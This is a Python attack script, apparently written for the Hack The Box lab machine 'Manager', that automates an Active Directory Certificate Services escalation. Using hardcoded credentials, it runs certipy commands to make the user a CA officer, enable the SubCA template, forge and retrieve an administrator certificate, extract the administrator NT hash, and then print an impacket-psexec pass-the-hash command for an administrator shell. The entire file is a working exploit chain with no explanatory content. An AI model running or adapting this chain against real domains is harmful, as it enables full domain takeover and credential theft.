import subprocess
import re
import os
import pty
import tty
import select
import sys

dc_ip = "10.10.11.236"
username = "raven@manager.htb"
password = "R4v3nBe5tD3veloP3r!123"

# Function to clear files by extension
def clear_files_by_extension(extension):
    for root, _, files in os.walk("."):
        for file in files:
            if file.endswith(extension):
                os.remove(os.path.join(root, file))

# Clear all *.key, *.pfx, and *.ccache files
clear_files_by_extension(".key")
clear_files_by_extension(".pfx")
clear_files_by_extension(".ccache")

# synctime
timecommand = "sudo rdate -n manager.htb"

process = subprocess.Popen(timecommand, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

# Wait for the command to finish and get the output
output, errors = process.communicate()

# Print the command output
print("Sync time:")
print(output.decode())

# Print any errors, if any
if errors:
    print("Errors:")
    print(errors.decode())

# Define the commands
commands = [
    f"certipy ca -ca 'manager-DC01-CA' -add-officer raven -username {username} -password '{password}' -dc-ip {dc_ip}",
    f"certipy ca -ca 'manager-DC01-CA' -username {username} -password '{password}' -dc-ip {dc_ip} -enable-template 'SubCA'",
]

# Initialize request_id and admin_hash to None
request_id = None
admin_hash = None

# Function to run a command and print its output
def run_command(command):
    completed_process = subprocess.run(command, shell=True, text=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    print(completed_process.stdout)

    return completed_process
    
# Run the first two commands
for cmd in commands:
    completed_process = run_command(cmd)

    if completed_process.returncode != 0:
        print("Command failed with a non-zero exit status.")
        break

# Run the modified third command with 'y' sent to stdin
if request_id is None:
    third_command = f"echo 'y' | certipy req -username {username} -password '{password}' -ca 'manager-DC01-CA' -target {dc_ip} -template SubCA -upn administrator@manager.htb"
    completed_process = run_command(third_command)

    if completed_process.returncode == 0:
        match = re.search(r'\[\*\] Request ID is (\d+)', completed_process.stdout)
        if match:
            request_id = match.group(1)
           # print("Request ID:", request_id)
        else:
            print("Request ID not found in the command output.")
    else:
        print("Command failed with a non-zero exit status.")

# Continue with the remaining commands if a request ID is found
if request_id:
    commands = [
        f"certipy ca -ca 'manager-DC01-CA' -issue-request {request_id} -username {username} -password '{password}'",
        f"certipy req -username {username} -password '{password}' -ca 'manager-DC01-CA' -target {dc_ip} -retrieve {request_id}",
        f"certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'manager.htb' -dc-ip {dc_ip}"
    ]

    # Run the remaining commands
    for cmd in commands:
        completed_process = run_command(cmd)

        if completed_process.returncode != 0:
            print("Command failed with a non-zero exit status.")
        
        # Capture the admin hash from the latest command output
        admin_match = re.search(r'\[\*\] Got hash for \'administrator@manager.htb\': (\S+)', completed_process.stdout)
        if admin_match:
            admin_hash = admin_match.group(1)
           # print("Administrator Hash:", admin_hash)
else:
    print("No request ID found. Skipping the remaining commands.")

# Impacket-psexec command to get interactive shell
if admin_hash:
    impacket_command = f"impacket-psexec manager.htb/administrator@manager.htb -hashes {admin_hash} -dc-ip {dc_ip}"
    print(f"Please run command to get the administrator shell: \n")
    print(impacket_command)

else:
    print("No admin hash found. Skipping Impacket-psexec.")
